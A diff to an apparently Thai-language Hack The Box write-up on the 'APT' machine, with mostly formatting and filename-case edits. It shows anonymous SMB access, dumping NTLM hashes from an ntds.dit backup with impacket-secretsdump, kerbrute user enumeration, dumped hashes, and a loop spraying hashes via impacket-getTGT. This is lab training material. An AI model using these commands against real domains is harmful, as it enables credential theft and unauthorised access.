@@ -232,7 +232,7 @@ SMB         dead:beef::b885:d62a:d679:573f 445    APT              [*] Windows 1
 SMB         dead:beef::b885:d62a:d679:573f 445    APT              [+] htb.local\: 
 SMB         dead:beef::b885:d62a:d679:573f 445    APT              [*] Enumerated shares
 SMB         dead:beef::b885:d62a:d679:573f 445    APT              Share           Permissions     Remark
-SMB         dead:beef::b885:d62a:d679:573f 445    APT              -----		-----------     ------
+SMB         dead:beef::b885:d62a:d679:573f 445    APT              -----           -----------     ------
 SMB         dead:beef::b885:d62a:d679:573f 445    APT              backup          READ            
 SMB         dead:beef::b885:d62a:d679:573f 445    APT              IPC$                            Remote IPC
 SMB         dead:beef::b885:d62a:d679:573f 445    APT              NETLOGON                        Logon server share 
@@ -258,7 +258,7 @@ dead:beef::b885:d62a:d679:573f is an IPv6 address -- no workgroup available
 
 Connect to target 
 ```bash
-smbclient -N \\\\dead:beef::b885:d62a:d679:573f\backup
+smbclient -N \\\\dead:beef::b885:d62a:d679:573f\\backup
 Anonymous login successful
 Try "help" to get a list of possible commands.
 smb: \> ls 
@@ -295,7 +295,7 @@ Session completed.
 ```bash
 impacket-secretdump -system registry/SYSTEM -ntds Active\ Directory/ntds.dit LOCAL > backup_ad_dump
 
-grep ':::' backup_ad_dump | awk -F: '{print $1}' > user.txt
+grep ':::' backup_AD_dump | awk -F: '{print $1}' > user.txt
 ```
 
 ## Kerburte user Enum
@@ -319,7 +319,7 @@ kerbrute userenum -d 'htb.local' --dc apt.htb  ./users.txt -v  | grep VALID
 
 ```bash
 ┌──(kali㉿kali)-[~/Desktop/backup]
-└─$ cat backup_ad_dump | grep henry.vinson
+└─$ cat backup_AD_dump | grep henry.vinson
 henry.vinson:3647:aad3b435b51404eeaad3b435b51404ee:2de80758521541d19cabba480b260e8f:::
 henry.vinson:aes256-cts-hmac-sha1-96:4c0ec4cffc953266ed72d9b565da62115655d2f402416af92e4e76d121663e2f
 henry.vinson:aes128-cts-hmac-sha1-96:da63c28166768a2829f00d30ec9fbddd
@@ -329,11 +329,12 @@ henry.vinson:des-cbc-md5:80a2c83213b3dfd6
 เนื่องจาก hash ที่ได้มาไม่ถูกต้อง เราจึงจำเป้นต้องทำการเขียน script สำหรับทดสอบหา hash ที่สามารถใช้งานได้ 
 
 ```bash
-grep ':::' backup_ad_dump | awk -F: '{print $1'} > users
-cat backup_ad_dump | grep ::: | cut -d: -f 3-4 > hashes
+grep ':::' backup_AD_dump | awk -F: '{print $1'} > users
+cat backup_AD_dump | grep ::: | cut -d: -f 3-4 > hashes
 
 
 for x in $(cat hashes);do impacket-getTGT -hashes $x -dc-ip apt.htb.local htb/henry.vinson | grep -v Impacket | grep -v "KDC_ERR_PREAUTH_FAILED" | tee -a  valid_hash && echo $x >> valid_hash;done
-
-
 ```
+
+
+
